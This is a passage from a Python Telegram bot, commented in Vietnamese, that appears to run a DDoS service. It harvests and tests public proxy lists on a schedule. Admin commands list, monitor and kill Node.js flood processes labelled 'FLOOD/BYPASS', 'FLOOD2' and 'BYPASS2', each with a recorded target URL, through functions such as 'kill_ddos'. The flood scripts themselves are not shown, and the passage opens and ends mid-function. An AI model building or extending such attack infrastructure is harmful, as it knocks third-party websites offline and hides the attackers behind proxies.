            logger.info(f"Attempting to fetch proxies from: {url}")
            
            try:
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: requests.get(url, timeout=10)
                )
                response.raise_for_status()
                content = response.text.strip()
                
                if not content:
                    logger.warning(f"Empty response from {url}, trying another URL...")
                    continue
                    
                new_proxies = set()
                for proxy in content.splitlines():
                    proxy = proxy.strip()
                    if proxy and ':' in proxy and proxy not in working_proxies:
                        try:
                            ip, port = proxy.split(':')
                            ipaddress.ip_address(ip)
                            port = int(port)
                            if 1 <= port <= 65535:
                                new_proxies.add(proxy)
                        except:
                            continue

                if not new_proxies:
                    logger.warning(f"No valid new proxies found from {url}, trying another URL...")
                    continue

                logger.info(f"Found {len(new_proxies)} new valid proxies, checking connectivity...")

                # Kiểm tra và lưu proxy theo batch
                for i in range(0, len(new_proxies), BATCH_SIZE):
                    batch = list(new_proxies)[i:i + BATCH_SIZE]
                    tasks = []
                    for proxy in batch:
                        if proxy not in working_proxies:
                            tasks.append(check_proxy(proxy))
                    
                    if tasks:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        
                        working_batch = set()
                        for proxy, is_working in zip(batch, results):
                            if isinstance(is_working, bool) and is_working:
                                working_batch.add(proxy)
                                working_proxies.add(proxy)
                        
                        if working_batch:
                            async with aiofiles.open(proxy_path, 'a') as f:
                                await f.write('\n'.join(working_batch) + '\n')
                            logger.info(f"Added {len(working_batch)} working proxies to file")
                            new_proxies_found += len(working_batch)

                
            except Exception as e:
                logger.error(f"Error fetching proxies from {url}: {e}")
                continue

        # Xử lý kết quả cuối cùng
        total_duration = time.time() - start_time
        total_new_proxies = len(working_proxies) - len(existing_proxies)
        
        logger.info(
            f"Proxy update completed in {total_duration:.2f}s\n"
            f"URLs checked: {len(used_urls)}/{len(proxy_urls)}\n"
            f"Total proxies: {len(working_proxies)}\n"
            f"New proxies added: {total_new_proxies}"
        )
        
        return len(working_proxies), total_new_proxies

    except Exception as e:
        logger.error(f"Error in update_proxy: {e}")
        if os.path.exists(f"{proxy_path}.backup"):
            try:
                os.replace(f"{proxy_path}.backup", proxy_path)
                logger.info("Restored proxy file from backup due to error")
            except:
                pass
        return 0, 0

async def clean_proxy_file():
    """Làm sạch file proxy, loại bỏ trùng lặp và định dạng không đúng"""
    try:
        proxy_path = './modules/proxy.txt'
        if not os.path.exists(proxy_path):
            logger.warning("Proxy file not found")
            return 0

        # Đọc từng dòng proxy
        with open(proxy_path, 'r') as f:
            content = f.read()

        # Tách các proxy có thể bị dính
        # Tìm tất cả các địa chỉ IP:PORT bằng regex
        proxy_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})'
        potential_proxies = re.findall(proxy_pattern, content)
        
        valid_proxies = set()
        invalid_lines = []

        for proxy in potential_proxies:
            try:
                ip, port = proxy.split(':')
                # Validate IP
                ipaddress.ip_address(ip)
                # Validate port
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.add(proxy)
                else:
                    invalid_lines.append(proxy)
            except:
                invalid_lines.append(proxy)

        # Tạo backup
        backup_path = f"{proxy_path}.backup"
        with open(backup_path, 'w') as f:
            f.write(content)

        # Ghi lại file với các proxy hợp lệ
        valid_proxies = sorted(valid_proxies)
        with open(proxy_path, 'w') as f:
            f.write('\n'.join(valid_proxies))

        # Log kết quả
        logger.info(f"""Proxy cleaning results:
        - Original content length: {len(content)}
        - Valid unique proxies: {len(valid_proxies)}
        - Invalid entries removed: {len(invalid_lines)}
        - Invalid entries:
          {chr(10).join('  ' + l for l in invalid_lines[:10])}
          {f'... and {len(invalid_lines) - 10} more' if len(invalid_lines) > 10 else ''}
        """)

        return len(valid_proxies)

    except Exception as e:
        logger.error(f"Error cleaning proxy file: {e}")
        if os.path.exists(backup_path):
            os.replace(backup_path, proxy_path)
        return 0

async def check_and_update_proxy(context: ContextTypes.DEFAULT_TYPE):
    """Hàm callback cho job queue để cập nhật proxy"""
    global is_proxy_update_running
    
    if is_proxy_update_running:
        logger.warning("Proxy update already in progress, skipping...")
        return
        
    try:
        is_proxy_update_running = True
        logger.info("Running scheduled proxy update...")
        
        proxy_path = './modules/proxy.txt'
        BATCH_SIZE = 100  # Xử lý theo batch để tránh quá tải
        KEEP_BEST_PROXIES = 10000
        
        # Đọc và validate proxy hiện có
        try:
            with open(proxy_path, 'r') as f:
                content = f.read().strip()
        except FileNotFoundError:
            content = ""
            logger.warning("Proxy file not found, creating new one")
            
        # Tìm và validate proxy
        proxy_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})'
        potential_proxies = re.findall(proxy_pattern, content)
        valid_proxies = set()
        
        # Xử lý theo batch
        for i in range(0, len(potential_proxies), BATCH_SIZE):
            batch = potential_proxies[i:i + BATCH_SIZE]
            for proxy in batch:
                try:
                    ip, port = proxy.split(':')
                    ipaddress.ip_address(ip)
                    port = int(port)
                    if 1 <= port <= 65535:
                        valid_proxies.add(proxy)
                except:
                    continue
                    
            # Log tiến độ
            logger.info(f"Processed {i + len(batch)}/{len(potential_proxies)} proxies")
                
        # Giới hạn số lượng proxy nếu cần
        if len(valid_proxies) > KEEP_BEST_PROXIES:
            valid_proxies = set(random.sample(list(valid_proxies), KEEP_BEST_PROXIES))
            
        # Ghi lại file với các proxy hợp lệ
        async with aiofiles.open(proxy_path, 'w', newline='') as f:
            await f.write('\n'.join(sorted(valid_proxies)))
            await f.write('\n')
            
        logger.info(f"Saved {len(valid_proxies)} valid proxies")
        
        # Thêm proxy mới
        async def save_proxy_to_file(proxy):
            try:
                async with aiofiles.open(proxy_path, 'a', newline='') as f:
                    await f.write(f"{proxy}\n")
                return True
            except Exception as e:
                logger.error(f"Error saving proxy to file: {e}")
                return False
                
        # Tiếp tục với phần update proxy
        working, removed = await update_proxy()
        
        return working, removed
        
    except Exception as e:
        logger.error(f"Error in check_and_update_proxy: {e}")
        return 0, 0
    finally:
        is_proxy_update_running = False
# Cron job để tự động cập nhật proxy
async def proxy_cron():
    while True:
        try:
            logger.info("Starting proxy cron job...")
            working, removed = await update_proxy()
            logger.info(f"Cron job completed: {working} working proxies, {removed} removed")
            await asyncio.sleep(1800)  # Chờ 30 phút giữa các lần cập nhật
        except Exception as e:
            logger.error(f"Error in proxy cron job: {e}")
            await asyncio.sleep(300)  # Nếu lỗi, chờ 5 phút rồi thử lại

async def monitor_proxy_updates(context: CallbackContext):
    """Giám sát và đảm bảo proxy updates đang hoạt động"""
    try:
        proxy_path = './modules/proxy.txt'
        
        if not os.path.exists(proxy_path):
            logger.warning("Proxy file not found, triggering update...")
            await check_and_update_proxy(context)
            return
            
        # Kiểm tra thời gian sửa đổi của file proxy
        file_modified = os.path.getmtime(proxy_path)
        current_time = time.time()
        
        # Nếu file không được cập nhật trong 2 giờ
        if current_time - file_modified > 7200:  # 2 giờ
            logger.warning("Proxy file hasn't been updated for 2 hours, triggering update...")
            await check_and_update_proxy(context)
            
        # Kiểm tra số lượng proxy
        try:
            with open(proxy_path, 'r') as f:
                proxy_count = sum(1 for line in f if line.strip())
            
            if proxy_count < 100:  # Ngưỡng tối thiểu
                logger.warning(f"Low proxy count ({proxy_count}), triggering update...")
                await check_and_update_proxy(context)
        except Exception as e:
            logger.error(f"Error checking proxy count: {e}")
            
    except Exception as e:
        logger.error(f"Error in proxy monitor: {e}")

async def start_proxy_cron(application: Application):
    """Khởi động và thiết lập cron job proxy"""
    try:
        logger.info("Initializing proxy cron system...")
        proxy_path = './modules/proxy.txt'
        KEEP_BEST_PROXIES = 10000

        # Clean proxy ngay khi khởi động
        logger.info("Cleaning proxy file on startup...")
        await clean_proxy_file()

        # Kiểm tra và giới hạn proxy khi khởi động
        if os.path.exists(proxy_path):
            try:
                with open(proxy_path, 'r') as f:
                    proxies = [line.strip() for line in f if line.strip()]
                
                if len(proxies) > KEEP_BEST_PROXIES:
                    logger.info(f"Initial proxy count: {len(proxies)}, limiting to {KEEP_BEST_PROXIES}")
                    selected_proxies = random.sample(proxies, KEEP_BEST_PROXIES)
                    
                    # Backup file gốc
                    backup_path = f"{proxy_path}.backup"
                    with open(backup_path, 'w') as f:
                        f.write('\n'.join(proxies))
                    
                    # Ghi file mới với proxies đã giới hạn
                    with open(proxy_path, 'w') as f:
                        f.write('\n'.join(selected_proxies))
                    logger.info(f"Successfully limited initial proxies to {KEEP_BEST_PROXIES}")

                    # Clean lại một lần nữa sau khi giới hạn
                    await clean_proxy_file()
            except Exception as e:
                logger.error(f"Error limiting initial proxies: {e}")

        # Thiết lập job định kỳ
        job = application.job_queue.run_repeating(
            callback=check_and_update_proxy,
            interval=1800,  # 30 phút
            first=1,
            name='proxy_update'
        )
        
        if job:
            logger.info("Proxy cron job successfully scheduled")
        else:
            logger.error("Failed to schedule proxy cron job")
            
    except Exception as e:
        logger.error(f"Error setting up proxy cron: {e}")
# Thêm hàm để kiểm tra trạng thái proxy cron
@restrict_room
async def check_proxy_cron_status(update: Update, context: CallbackContext):
    """Kiểm tra trạng thái của proxy cron job"""
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        proxy_path = './modules/proxy.txt'
        
        # Kiểm tra file tồn tại
        if not os.path.exists(proxy_path):
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ KHÔNG CÓ FILE PROXY
║ • File proxy.txt không tồn tại
║ • Sử dụng /addpx để thêm proxy
╚═══════════════════════════''')
            return
            
        # Đọc và đếm số proxy
        with open(proxy_path, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
            
        total_proxies = len(proxies)
        
        # Kiểm tra proxy có hợp lệ không
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            try:
                ip, port = proxy.split(':')
                # Validate IP
                ipaddress.ip_address(ip)
                # Validate port
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
        
        # Kiểm tra trạng thái cron job
        jobs = context.job_queue.jobs()
        proxy_jobs = [job for job in jobs if job.name == 'proxy_update']
        
        if proxy_jobs:
            # Chuyển đổi thời gian sang múi giờ Việt Nam
            next_run_utc = proxy_jobs[0].next_t
            next_run_vn = next_run_utc.astimezone(vietnam_tz)
            next_run = next_run_vn.strftime('%H:%M:%S %d/%m/%Y')
            
            # Lấy thời gian hiện tại theo múi giờ VN
            current_time = get_vietnam_time()
            time_until = next_run_vn - current_time
            minutes_until = int(time_until.total_seconds() / 60)
            
            message = f'''
╔═════════════════════════
║ ✅ PROXY CRON STATUS
║ • Trạng thái: Đang chạy
║ • Lần cập nhật tiếp theo: {next_run}
║ • Còn: {minutes_until} phút
║ 📊 THÔNG TIN PROXY:
║ • Tổng số proxy: {total_proxies}
║ • Proxy hợp lệ: {len(valid_proxies)}
║ • Proxy không hợp lệ: {len(invalid_proxies)}'''

            if invalid_proxies:
                message += f'''
║ • Proxy lỗi ({min(5, len(invalid_proxies))}):
║ {chr(10).join(f"• {proxy}" for proxy in invalid_proxies[:5])}'''
                if len(invalid_proxies) > 5:
                    message += f'''
║ • Và {len(invalid_proxies) - 5} proxy lỗi khác...'''
                    
            message += '''
╚═══════════════════════════'''

            await update.message.reply_text(message)
        else:
            await update.message.reply_text(f'''
╔═════════════════════════
║ ❌ PROXY CRON STATUS
║ • Trạng thái: Không hoạt động
║ • Vui lòng khởi động lại bot
║ 📊 THÔNG TIN PROXY:
║ • Tổng số proxy: {total_proxies}
║ • Proxy hợp lệ: {len(valid_proxies)}
║ • Proxy không hợp lệ: {len(invalid_proxies)}
╚═══════════════════════════''')
            
    except Exception as e:
        logger.error(f"Error checking proxy cron status: {e}")
        await update.message.reply_text(f"Error checking cron status: {str(e)}")
# Task Manager Command
async def send_monitoring_info(context: ContextTypes.DEFAULT_TYPE):
    try:
        # CPU & Memory info
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        memory_used = round(memory.used/1024/1024/1024, 2)
        memory_total = round(memory.total/1024/1024/1024, 2)
        memory_percent = memory.percent

        monitoring_info = f"""
╭━━━━━「 System Monitor 」━━━━━
┣━⊳ 🔲 CPU: {cpu_percent}%
┣━⊳ 💾 RAM: {memory_percent}%
┣━⊳ 📊 RAM Used: {memory_used}/{memory_total}GB
╰━━━━━━━━━━━━━━━━━━━━━━━━━"""

        await context.bot.send_message(
            chat_id=MONITOR_CHAT_ID,
            text=monitoring_info
        )
    except Exception as e:
        logger.error(f"Error in monitoring task: {e}")


@restrict_room
async def task(update: Update, context: CallbackContext):
    global monitoring_task
    try:
        user_id = update.message.from_user.id
        if user_id not in admins:
            return

        # Kiểm tra xem có argument "start" hoặc "stop" không
        if context.args:
            if context.args[0].lower() == "on":
                # Kiểm tra xem monitoring_task đã tồn tại và đang chạy chưa
                if monitoring_task and not monitoring_task.removed:
                    await update.message.reply_text("Monitoring đã được bật!")
                    return
                monitoring_task = context.job_queue.run_repeating(
                    send_monitoring_info,
                    interval=15, #15 giây gửi cái
                    first=1,
                    name='system_monitoring'
                )
                await update.message.reply_text("Đã bật monitoring!")
                return
            elif context.args[0].lower() == "off":
                if monitoring_task and not monitoring_task.removed:
                    monitoring_task.schedule_removal()
                    monitoring_task = None
                    await update.message.reply_text("Đã tắt monitoring!")
                    return
                await update.message.reply_text("Monitoring chưa được bật!")
                return

        # CPU & Memory info
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        memory_used = round(memory.used/1024/1024/1024, 2)
        memory_total = round(memory.total/1024/1024/1024, 2)
        memory_percent = memory.percent

        # Process count
        process_count = len(psutil.pids())

        # Network info
        net_io = psutil.net_io_counters()
        bytes_sent = round(net_io.bytes_sent/1024/1024, 2)
        bytes_recv = round(net_io.bytes_recv/1024/1024, 2)

        # Disk info
        total_disk_space = 0
        used_disk_space = 0
        try:
            partitions = psutil.disk_partitions()
            for partition in partitions:
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                    total_disk_space += partition_usage.total
                    used_disk_space += partition_usage.used
                except Exception:
                    continue
            
            total_disk_space_gb = round(total_disk_space/1024/1024/1024, 2)
            used_disk_space_gb = round(used_disk_space/1024/1024/1024, 2)
            disk_percent = round((used_disk_space / total_disk_space) * 100, 2)
        except Exception as e:
            logger.error(f"Error getting disk info: {e}")
            total_disk_space_gb = used_disk_space_gb = disk_percent = 0

        # Uptime
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        days = uptime.days
        hours, remainder = divmod(uptime.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{days} ngày, {hours} giờ, {minutes} phút"

        system_info = f"""
╭━━━━━「 Thông Tin Hệ Thống 」━━━━━
┣━⊳ 🔲 CPU: {cpu_percent}%
┣━⊳ 💾 RAM: {memory_percent}%
┣━⊳ 📊 RAM đã dùng: {memory_used}/{memory_total}GB
┣━⊳ 💿 Tổng bộ nhớ: {total_disk_space_gb}GB
┣━⊳ 📀 Đã sử dụng: {used_disk_space_gb}GB ({disk_percent}%)
┣━⊳ 🌐 Network:
┣━⊳ ⬆️ Đã gửi: {bytes_sent}MB
┣━⊳ ⬇️ Đã nhận: {bytes_recv}MB
┣━⊳ ⏰ Uptime: {uptime_str}
┗━⊳ 📱 Số tiến trình: {process_count}
╰━━━━━━━━━━━━━━━━━━━━━━━━━"""

        # Thêm thông tin về trạng thái monitoring
        if monitoring_task and not monitoring_task.removed:
            system_info += "\n📊 Monitoring: Đang chạy"
        else:
            system_info += "\n📊 Monitoring: Đã tắt"

        await update.message.reply_text(system_info)

    except Exception as e:
        logger.error(f"Error in task command: {e}")
        await update.message.reply_text(f"❌ Lỗi khi lấy thông tin hệ thống: {str(e)}")

@restrict_room
async def list_processes(update: Update, context: CallbackContext):
    try:
        user_id = update.message.from_user.id
        if user_id not in admins:
            return

        # Tìm tất cả các tiến trình node.js đang chạy
        node_processes = []
        # Thêm các file mới vào danh sách target
        target_files = [
            'two-methods.js',
            'non-protection.js',
            'try-protection.js'
        ]
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'create_time', 'memory_info']):
            try:
                # Kiểm tra nếu process info là None
                if not proc.info:
                    continue
                    
                # Kiểm tra tên process
                if proc.info.get('name') != 'node':
                    continue
                    
                # Lấy và kiểm tra cmdline
                cmdline = proc.info.get('cmdline')
                if not cmdline:  # Skip if cmdline is None or empty
                    continue
                    
                # Kiểm tra xem có phải process target không
                is_target_process = any(file in ' '.join(cmdline) for file in target_files)
                
                if is_target_process:
                    process = psutil.Process(proc.info['pid'])
                    create_time = datetime.fromtimestamp(process.create_time())
                    running_time = datetime.now() - create_time
                    memory_info = process.memory_info()
                    memory_mb = round(memory_info.rss / 1024 / 1024, 2) if memory_info else 0
                    
                    target_url = "N/A"
                    process_type = "N/A"
                    
                    # Tìm URL và loại process
                    for i, cmd in enumerate(cmdline):
                        if any(file in cmd for file in target_files):
                            # Xác định loại process dựa trên tên file
                            if "two-methods.js" in cmd:
                                process_type = "FLOOD/BYPASS"
                                if i + 1 < len(cmdline):
                                    target_url = cmdline[i + 1]
                            elif "non-protection.js" in cmd:
                                process_type = "FLOOD2"
                                if i + 1 < len(cmdline):
                                    target_url = cmdline[i + 1]
                            elif "try-protection.js" in cmd:
                                process_type = "BYPASS2"
                                # Với try-protection.js, URL nằm ở vị trí cuối cùng
                                target_url = cmdline[-1]
                            break
                    
                    node_processes.append({
                        'pid': proc.info['pid'],
                        'target': target_url,
                        'type': process_type,
                        'memory': memory_mb,
                        'running_time': running_time
                    })
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, Exception) as e:
                logger.error(f"Error processing process: {e}")
                continue

        if not node_processes:
            await update.message.reply_text('''<blockquote expandable>
Không có tiến trình nào đang chạy</blockquote>''', parse_mode='HTML')
            return

        # Chia danh sách tiến trình thành các phần nhỏ hơn
        MAX_PROCESSES_PER_MESSAGE = 5
        chunks = [node_processes[i:i + MAX_PROCESSES_PER_MESSAGE] 
                 for i in range(0, len(node_processes), MAX_PROCESSES_PER_MESSAGE)]
        
        # Gửi từng phần như một tin nhắn riêng biệt
        for index, chunk in enumerate(chunks):
            process_list = []
            for i, proc in enumerate(chunk, 1 + index * MAX_PROCESSES_PER_MESSAGE):
                hours, remainder = divmod(proc['running_time'].seconds, 3600)
                minutes, seconds = divmod(remainder, 60)
                runtime = f"{hours}h {minutes}m {seconds}s"
                
                process_list.append(f'''<blockquote expandable>
║ 📌 Tiến trình {i}:
║ • PID: <code>{proc['pid']}</code>
║ • Target: <code>{proc['target']}</code>
║ • Type: {proc['type']}
║ • RAM: {proc['memory']} MB
║ • Thời gian chạy: {runtime}</blockquote>''')

            # Tạo tin nhắn cho phần hiện tại
            message = f'''<blockquote expandable>
╔═════════════════════════
║ 📊 DANH SÁCH TIẾN TRÌNH ({index + 1}/{len(chunks)})
║ • Tổng số: {len(node_processes)}{''.join(process_list)}
╚═══════════════════════════</blockquote>'''

            await update.message.reply_text(message, parse_mode='HTML')
            # Đợi một chút giữa các tin nhắn để tránh spam
            if index < len(chunks) - 1:
                await asyncio.sleep(0.5)

    except Exception as e:
        logger.error(f"Error in list_processes command: {e}")
        await update.message.reply_text(f'''<blockquote expandable>
❌ Lỗi khi lấy danh sách tiến trình
• {str(e)}</blockquote>''')

@restrict_room
async def kill_ddos(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        args = context.args
        specific_pid = None if not args else int(args[0])
        killed_processes = []
        
        # Danh sách các file cần kiểm tra
        target_files = [
            'two-methods.js',
            'non-protection.js',
            'try-protection.js'
        ]
        
        if specific_pid:
            # Kill specific process
            try:
                process = psutil.Process(specific_pid)
                cmdline = ' '.join(process.cmdline())
                if process.name() == 'node' and any(file in cmdline for file in target_files):
                    process.kill()
                    killed_processes.append(specific_pid)
                else:
                    await update.message.reply_text(f'''
❌ PID {specific_pid} KHÔNG HỢP LỆ
• PID không phải là tiến trình DDoS
• Sử dụng /ls để xem danh sách PID
''')
                    return
            except psutil.NoSuchProcess:
                await update.message.reply_text(f'''
❌ KHÔNG TÌM THẤY PID {specific_pid}
• PID không tồn tại
• Sử dụng /lsd để xem danh sách PID
''')
                return
            except Exception as e:
                logger.error(f"Error killing specific process: {e}")
                await update.message.reply_text(f"❌ Lỗi khi kill PID {specific_pid}: {str(e)}")
                return
        else:
            # Kill all processes
            bot_active = False
            
            # Kill through psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['name'] == 'node':
                        cmdline = proc.info.get('cmdline', [])
                        if cmdline and any(file in ' '.join(cmdline) for file in target_files):
                            process = psutil.Process(proc.info['pid'])
                            process.kill()
                            killed_processes.append(proc.info['pid'])
                except Exception as e:
                    logger.error(f"Error killing process: {e}")
                    continue
            
            # Additional shell kill command for cleanup
            try:
                if os.name == 'nt':  # Windows
                    os.system('taskkill /F /IM node.exe')
                else:  # Linux/Unix
                    kill_commands = [
                        "pkill -9 -f 'node.*two-methods.js'",
                        "pkill -9 -f 'node.*non-protection.js'",
                        "pkill -9 -f 'node.*try-protection.js'"
                    ]
                    for cmd in kill_commands:
                        os.system(cmd)
            except Exception as e:
                logger.error(f"Error killing via shell: {e}")

        # Prepare response message
        if killed_processes:
            if specific_pid:
                message = f'''
✅ KILL PID {specific_pid} THÀNH CÔNG
• Tiến trình đã dừng
• Sử dụng /lsd để xem danh sách còn lại'''
            else:
                message = f'''
✅ KILL ALL SUCCESS
• Đã dừng {len(killed_processes)} tiến trình
• PIDs: {', '.join(map(str, killed_processes))}
• Bot đã tắt
• Sử dụng /ond để bật lại'''
        else:
            message = '''
❌ KHÔNG CÓ TIẾN TRÌNH ĐANG CHẠY
• Bot đã tắt
• Sử dụng /ond để bật lại'''

        await update.message.reply_text(message)
            
    except ValueError:
        await update.message.reply_text('''
❌ PID KHÔNG HỢP LỆ
▶ Usage:
• /kill : Dừng tất cả tiến trình
• /kill <pid> : Dừng tiến trình cụ thể
• Sử dụng /lsd để xem danh sách PID''')
    except Exception as e:
        logger.error(f"Error in kill_ddos: {e}")

def kill_all_processes():
    """Kill all running Node.js processes on startup"""
    try:
        logger.info("Killing all existing Node.js processes...")
        killed_count = 0
        
        # Danh sách các file cần kiểm tra
        target_files = [
            'two-methods.js',
            'non-protection.js',
            'try-protection.js'
        ]
        
        # Kill qua psutil
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['name'] == 'node':
                    cmdline = proc.info.get('cmdline', [])
                    # Kiểm tra nếu cmdline chứa bất kỳ file nào trong target_files
                    if cmdline and any(file in ' '.join(cmdline) for file in target_files):
                        process = psutil.Process(proc.info['pid'])
                        
                        # Kill các tiến trình con trước
                        children = process.children(recursive=True)
                        for child in children:
                            child.kill()
                        psutil.wait_procs(children, timeout=3)
                        
                        # Kill tiến trình cha
                        process.kill()
                        killed_count += 1
                        
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                logger.error(f"Error killing process via psutil: {e}")
                continue
                
        # Kill qua shell command để đảm bảo
        try:
            if os.name == 'nt':  # Windows
                os.system('taskkill /F /IM node.exe')
            else:  # Linux/Unix
                # Kill cả hai loại process
                kill_commands = [
                    "pkill -9 -f 'node.*two-methods.js'",
                    "pkill -9 -f 'node.*non-protection.js'",
                    "pkill -9 -f 'node.*try-protection.js'"
                ]
                for cmd in kill_commands:
                    os.system(cmd)
        except Exception as e:
            logger.error(f"Error killing processes via shell: {e}")
            
        # Clear attack processes dictionary
        attack_processes.clear()
        
        logger.info(f"Successfully killed {killed_count} Node.js processes")
        
    except Exception as e:
        logger.error(f"Error in kill_all_processes: {e}")


async def add_proxy(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
    try:
        # Lấy nội dung tin nhắn
        message_text = update.message.text
        
        # Tách lệnh và danh sách proxy
        lines = message_text.split('\n')
        if len(lines) < 2:
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ KHÔNG CÓ PROXY
║ • Vui lòng nhập proxy theo định dạng
║ • /addpx
║ • ip:port
║ • ip:port
╚═══════════════════════════''')
            return
            
        # Lọc bỏ dòng lệnh và lấy danh sách proxy
        proxies = lines[1:]
        
        # Kiểm tra định dạng proxy
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            proxy = proxy.strip()
            if not proxy:  # Bỏ qua dòng trống
                continue
                
            # Kiểm tra định dạng ip:port
            try:
                ip, port = proxy.split(':')
                # Kiểm tra IP hợp lệ
                ipaddress.ip_address(ip)
                # Kiểm tra port hợp l���
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
                
        if not valid_proxies:
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ KHÔNG CÓ PROXY HỢP LỆ
║ • Tất cả proxy không đúng định dạng
║ • Vui lòng kiểm tra lại
╚═══════════════════════════''')
            return
            
        # Lưu proxy vào file
        proxy_path = './modules/proxy.txt'
        os.makedirs(os.path.dirname(proxy_path), exist_ok=True)
        
        # Ghi proxy mới vào file, ghi đè proxy cũ
        with open(proxy_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid_proxies))
            
        # Gửi thông báo kết quả
        message = f'''
╔═════════════════════════
║ ✅ CẬP NHẬT PROXY THÀNH CÔNG
║ • Tổng số proxy: {len(valid_proxies)}
║ • Proxy hợp lệ: {len(valid_proxies)}'''
        
        if invalid_proxies:
            message += f'''
║ • Proxy không hợp lệ: {len(invalid_proxies)}
║ • Danh sách proxy lỗi:
║ {chr(10).join(f"• {proxy}" for proxy in invalid_proxies[:5])}'''
            if len(invalid_proxies) > 5:
                message += f'''
║ • Và {len(invalid_proxies) - 5} proxy khác...'''
            
        message += '''
╚═══════════════════════════'''
        
        await update.message.reply_text(message)
        
    except Exception as e:
        logger.error(f"Error in add_proxy: {e}")
        await update.message.reply_text(f'''
╔═════════════════════════
║ ❌ LỖI CẬP NHẬT PROXY
║ • {str(e)}
╚═══════════════════════════''')
        
async def update_proxy_new(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
    try:
        # Lấy nội dung tin nhắn
        message_text = update.message.text
        
        # Tách lệnh và danh sách proxy
        lines = message_text.split('\n')
        if len(lines) < 2:
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ KHÔNG CÓ PROXY
║ • Vui lòng nhập proxy theo định dạng
║ • /uppx
║ • ip:port
║ • ip:port
╚═══════════════════════════''')
            return
            
        # Lọc bỏ dòng lệnh và lấy danh sách proxy
        proxies = lines[1:]
        
        # Kiểm tra định dạng proxy
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            proxy = proxy.strip()
            if not proxy:  # Bỏ qua dòng trống
                continue
                
            # Kiểm tra định dạng ip:port
            try:
                ip, port = proxy.split(':')
                # Kiểm tra IP hợp lệ
                ipaddress.ip_address(ip)
                # Kiểm tra port hợp lệ
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
                
        if not valid_proxies:
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ KHÔNG CÓ PROXY HỢP LỆ
║ • Tất cả proxy không đúng định dạng
║ • Vui lòng kiểm tra lại
╚═══════════════════════════''')
            return
            
        # Đọc proxy cũ từ file
        proxy_path = './modules/proxy.txt'
        os.makedirs(os.path.dirname(proxy_path), exist_ok=True)
        
        existing_proxies = []
        if os.path.exists(proxy_path):
            with open(proxy_path, 'r', encoding='utf-8') as f:
                existing_proxies = [line.strip() for line in f if line.strip()]
        
        # Loại bỏ proxy trùng lặp từ danh sách mới
        new_valid_proxies = [p for p in valid_proxies if p not in existing_proxies]
        
        # Kết hợp proxy mới và cũ
        all_proxies = new_valid_proxies + existing_proxies
        
        # Lưu tất cả proxy vào file
        with open(proxy_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(all_proxies))
            
        # Gửi thông báo kết quả
        message = f'''
╔═════════════════════════
║ ✅ CẬP NHẬT PROXY THÀNH CÔNG
║ • Proxy cũ: {len(existing_proxies)}
║ • Proxy mới thêm: {len(new_valid_proxies)}
║ • Tổng số proxy: {len(all_proxies)}'''
        
        if invalid_proxies:
            message += f'''
║ • Proxy không hợp lệ: {len(invalid_proxies)}
║ • Danh sách proxy lỗi:
║ {chr(10).join(f"• {proxy}" for proxy in invalid_proxies[:5])}'''
            if len(invalid_proxies) > 5:
                message += f'''
║ • Và {len(invalid_proxies) - 5} proxy khác...'''
            
        message += '''
╚═══════════════════════════'''
        
        await update.message.reply_text(message)
        
    except Exception as e:
        logger.error(f"Error in update_proxy: {e}")
        await update.message.reply_text(f'''
╔═════════════════════════
║ ❌ LỖI CẬP NHẬT PROXY
║ • {str(e)}
╚═══════════════════════════''')


@restrict_room
async def restart_bot(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        # Gửi thông báo đang khởi động lại và lưu message
        status_message = await update.message.reply_text('''
╔═════════════════════════
║ 🔄 ĐANG KHỞI ĐỘNG LẠI
║ • Vui lòng đợi...
╚═══════════════════════════''')
        
        # Lưu thông tin khởi động lại
        restart_info = {
            "chat_id": update.effective_chat.id,
            "message_id": status_message.message_id,
            "restart_time": time.time(),
            "action": "restart"
        }
        
        # Đảm bảo thư mục tồn tại
        os.makedirs('data', exist_ok=True)
        
        # Lưu thông tin vào file trong thư mục data
        with open("data/restart_info.json", "w") as f:
            json.dump(restart_info, f)
            
        logger.info(f"Saved restart info: {restart_info}")
        
